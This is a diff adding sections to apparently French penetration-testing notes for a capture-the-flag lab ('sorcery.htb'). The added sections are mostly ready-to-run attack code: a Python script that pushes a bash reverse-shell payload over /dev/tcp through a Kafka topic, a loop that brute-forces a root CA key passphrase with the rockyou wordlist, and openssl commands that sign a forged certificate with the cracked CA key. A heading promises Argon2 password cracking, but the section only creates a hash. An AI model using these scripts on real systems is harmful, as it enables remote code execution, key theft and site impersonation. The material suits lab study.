@@ -546,3 +546,77 @@ for name, obj in globals().items():
     except Exception:
         pass
 ```
+
+***
+
+## Argon 2 Python paasword cracking
+
+```
+└─$ python3 -c "import argon2; print(argon2.PasswordHasher().hash('P@ssword@123'))"
+$argon2id$v=19$m=65536,t=3,p=4$5yNzSyjBWFb+8J61AawPkg$R9x9FEBYERukEvHc+DDfQA
+```
+
+***
+
+## Script Python pour envoyer des messages Kafka
+
+```python
+#!/usr/bin/env python3
+from kafka import KafkaProducer
+import sys
+
+def send_reverse_shell(target_ip, target_port, kafka_host='localhost:9092'):
+    try:
+        producer = KafkaProducer(bootstrap_servers=[kafka_host])
+        payload = f'/bin/bash -i >& /dev/tcp/{target_ip}/{target_port} 0>&1'.encode()
+        future = producer.send('update', value=payload)
+        result = future.get(timeout=10)
+        print(f"[+] Reverse shell envoyé vers {target_ip}:{target_port}")
+        producer.close()
+        return True
+    except Exception as e:
+        print(f"[-] Erreur: {e}")
+        return False
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        sys.exit(1)
+    target_ip = sys.argv[1]
+    target_port = sys.argv[2]
+    send_reverse_shell(target_ip, target_port)
+```
+
+***
+
+## Bruteforce de la passphrase du CA&#x20;
+
+```bash
+#!/bin/bash
+while IFS= read -r pass; do
+    openssl rsa -in RootCA.key -out /dev/null -passin pass:"$pass" 2>/dev/null && { echo "Password found: $pass"; exit 0; }
+done < /usr/share/wordlists/rockyou.txt
+```
+
+***
+
+## Génération du certificat HTTPS
+
+{% code fullWidth="true" %}
+```bash
+# Génération de la clé privée
+└─$ openssl genrsa -out match.sorcery.htb.key 2048
+
+# Génération de la demande de certificat
+└─$ openssl req -new -key match.sorcery.htb.key -out match.sorcery.htb.csr -subj "/CN=match.sorcery.htb"
+
+# Déchiffrement de la clé CA
+└─$ openssl rsa -in RootCA.key -out RootCA-unenc.key
+Enter pass phrase for RootCA.key: password
+
+# Signature du certificat
+└─$ openssl x509 -req -in match.sorcery.htb.csr -CA RootCA.crt -CAkey RootCA-unenc.key -CAcreateserial -out match.sorcery.htb.crt -days 365
+
+# Combinaison en fichier PEM
+└─$ cat match.sorcery.htb.key match.sorcery.htb.crt > match.sorcery.htb.pem
+```
+{% endcode %}
